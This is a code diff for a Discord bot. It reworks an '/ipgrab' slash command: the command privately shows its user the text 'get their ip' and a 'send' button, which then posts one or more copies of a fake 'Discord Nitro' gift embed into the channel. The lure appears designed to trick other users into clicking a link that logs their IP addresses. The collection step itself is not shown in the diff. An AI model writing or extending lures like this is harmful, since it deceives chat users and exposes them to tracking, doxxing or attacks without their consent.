@@ -121,7 +121,26 @@ client.on(Events.InteractionCreate, async interaction => {
 
     // ---------------- /ipgrab ----------------
     if (interaction.isChatInputCommand() && interaction.commandName === 'ipgrab') {
-      const embed = new EmbedBuilder()
+      const amount = interaction.options.getInteger('amount') ?? 1;
+
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId(`ipgrab:${amount}`)
+          .setLabel('send')
+          .setStyle(ButtonStyle.Success)
+      );
+
+      return interaction.reply({
+        content: 'get their ip',
+        components: [row],
+        flags: MessageFlags.Ephemeral,
+      });
+    }
+
+    if (interaction.isButton() && interaction.customId.startsWith('ipgrab:')) {
+      const amount = Number(interaction.customId.slice(7)) || 1;
+
+      const buildEmbed = () => new EmbedBuilder()
         .setColor(0x5865F2)
         .setTitle('Discord Nitro')
         .setDescription(
@@ -131,7 +150,11 @@ client.on(Events.InteractionCreate, async interaction => {
         )
         .setThumbnail(NITRO_ICON);
 
-      return interaction.reply({ embeds: [embed] });
+      await interaction.reply({ embeds: [buildEmbed()] });
+      for (let i = 1; i < amount; i++) {
+        await interaction.followUp({ embeds: [buildEmbed()] });
+      }
+      return;
     }
   } catch (err) {
     console.error(err);
